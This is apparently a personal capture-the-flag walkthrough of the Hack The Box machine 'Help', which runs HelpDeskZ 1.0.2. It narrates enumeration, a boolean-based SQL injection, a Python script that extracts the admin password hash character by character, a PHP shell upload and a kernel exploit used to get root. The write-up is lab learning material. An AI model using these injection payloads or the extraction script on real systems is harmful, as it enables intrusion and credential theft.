+++
title = 'Help'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan
![Help (Easy Linux).png](Help%20%28Easy%20Linux%29.png)

Going to port 80 shows default Apache page
![Help (Easy Linux)-1.png](Help%20%28Easy%20Linux%29-1.png)
Going to port 3000 is a json response - seems like some API
![Help (Easy Linux)-2.png](Help%20%28Easy%20Linux%29-2.png)
Fuzzing finds help.htb/support :
![Help (Easy Linux)-3.png](Help%20%28Easy%20Linux%29-3.png)

Help Desk Z is an open source software and github repo is at https://github.com/helpdesk-z/helpdeskz-dev/blob/master/.htaccess
The version in the github repo doesn't seem to have many vulnerabilities but there are some vulnerabilities for older versions. I haven't been able to determine what version this one at help.htb/support is.

Lets look deeper into help.htb:3000

![Help (Easy Linux)-4.png](Help%20%28Easy%20Linux%29-4.png)

The headers show some interesting stuff - Express and then an ETag. Googling Express, it seems to be Express.js which is a minimalist web framework for Node.js.

![Help (Easy Linux)-5.png](Help%20%28Easy%20Linux%29-5.png)

Had to get some help for the endpoint above, especially considering its not in fuzzing directories? Need to watch Ippsec video maybe for better understanding on how to find this

Lets continue.

Using the stack traces and context of the original message telling "Shiv" that credentials can be queried
![Help (Easy Linux)-6.png](Help%20%28Easy%20Linux%29-6.png)
![Help (Easy Linux)-8.png](Help%20%28Easy%20Linux%29-8.png)
`helpme@helpme.com`
`godhelpmeplz`
Entering the credentials into the website, an error message appears.

![Help (Easy Linux)-9.png](Help%20%28Easy%20Linux%29-9.png)

Oh that was weird, I just tried again and it worked - oh well lets continue.

There is a file upload and it seems the vulnerability is here somewhere. 

Okay somehow, we are supposed to be able to figure out the version of the software is 1.0.2 but I have no idea how that was found? But ill see when I watch the video. This might be something to do with the box being old as now there is a much newer version of the software.

Okay so I watched the video because this whole path has sort of been a bit off.

We see that based on the github repo structure - there may be a README.md:
![Help (Easy Linux)-10.png](Help%20%28Easy%20Linux%29-10.png)
Going to http://help.htb/support/README.md , there is in fact a README.md we can download

This shows us that the version is in fact 1.0.2
![Help (Easy Linux)-11.png](Help%20%28Easy%20Linux%29-11.png)
![Help (Easy Linux)-12.png](Help%20%28Easy%20Linux%29-12.png)

It seems that you can upload .php, even though we get that error page - it seems the php file does get uploaded. The filename is obfuscated but the exploit shows it is related to time.

So lets upload a shell - and then run this python script

Okay for some reason this exploit doesn't work - lets look into the SQL injection one
(even though it worked in Ippsec video)

The actual exploit script is broken but following along, we see we have to go to the attachment download link

![Help (Easy Linux)-14.png](Help%20%28Easy%20Linux%29-14.png)

We see that adding AND 1=1-- still gives us the file but AND 1=0-- doesn't:

![Help (Easy Linux)-15.png](Help%20%28Easy%20Linux%29-15.png)

So there is boolean-based sql injection, putting this into sqlmap results in a success and able to enumerate and find database, tables, columns...etc. This is very slow - we can probably guess the table "staff"

We are able to see that there is a username and password column
![Help (Easy Linux)-16.png](Help%20%28Easy%20Linux%29-16.png)

"admin" is the username
![Help (Easy Linux)-17.png](Help%20%28Easy%20Linux%29-17.png)

we can write a script to enumerate the password OR I just try to fix the exploit script. I'm gonna try just fix the exploit script first by putting in the correct endpoints

nvm the exploit is so broken

```python
import requests

cookies = {
        "lang":"english",
        "PHPSESSID":"ffje9vbg4hlf1bbdfdie8s1044",
        "usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BH%2FjKDEz253n6ozUnIWcCOKmu9g60CEJ9QKffVBfX%2FmCQ%3D%3D"
        }

hash_characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']

password_hash = ""

for i in range(1,41): # SHA1 hash it seems? From HelpDeskZ 1.0.2 github
    for char in hash_characters:
        response = requests.get(f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=7&param[]=attachment&param[]=4&param[]=9+and+substr((select+(password)+from+staff+limit+0,1),{i},1)+%3d+'{char}'--", cookies=cookies)
        
        if "Page not found - 404" in str(response.content):
            continue
        else:
            password_hash += char
            print(f"Password hash: {password_hash}")
            break
```

I coded the above to use the boolean based to determine the password hash

The hash is taking ages to get - OMG I FIGURED OUT WHY THE SHELL UPLOAD DIDNT WORK
I gave the exploit the wrong base url

![Help (Easy Linux)-18.png](Help%20%28Easy%20Linux%29-18.png)

Hell yeah, fuck the hash method its too slow
![Help (Easy Linux)-19.png](Help%20%28Easy%20Linux%29-19.png)

Basic enumeration
![Help (Easy Linux)-21.png](Help%20%28Easy%20Linux%29-21.png)

This kernel is vulnerable as it is old and running the exploit https://www.exploit-db.com/exploits/44298 gives us root

![Help (Easy Linux)-20.png](Help%20%28Easy%20Linux%29-20.png)



